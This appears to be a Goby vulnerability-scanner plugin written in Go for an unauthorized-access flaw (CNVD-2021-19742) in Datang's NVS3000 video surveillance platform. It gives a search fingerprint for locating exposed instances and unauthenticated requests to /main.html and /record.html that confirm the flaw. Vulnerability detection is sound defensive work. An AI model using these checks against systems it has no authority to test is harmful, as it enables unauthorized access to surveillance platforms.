package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "NVS3000 integrated video surveillance platform is not accessible CNVD-2021-19742",
  "Description": "Datang Telecom Technology Co., Ltd. is a provider of information and communication products and integrated solutions.\\nNVS3000 integrated video surveillance platform of Datang Telecom Technology Co., LTD has an unauthorized access vulnerability, which can be used by attackers to obtain sensitive system information.",
  "Product": "NVS3000 integrated video surveillance platform",
  "Homepage": "http://www.datang.com",
  "DisclosureDate": "2021-08-02",
  "Author": "luckying1314@139.com",
  "GobyQuery": "title=\"综合视频监控平台\"",
  "Level": "1",
  "Impact": "<p><font color=\"#4a90e2\"><span style=\"font-size: 14px;\">The application system does not perform valid identity verification on the service function page. If you have not logged in and obtained the access address of the service function page, you can directly operate the functions on the page, which may cause malicious damage to the application system</span></font><br></p>",
  "Recommandation": "<p>Authenticate sensitive resources or information.<br></p>",
  "References": [
    "https://www.cnvd.org.cn/flaw/show/CNVD-2021-19742"
  ],
  "HasExp": false,
  "ExpParams": null,
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "OR",
    {
      "Request": {
        "method": "GET",
        "uri": "/main.html",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "大数据分析",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "公告发布",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/record.html",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "大数据分析",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "公告发布",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": null,
  "Tags": [
    "Unauthorized access"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}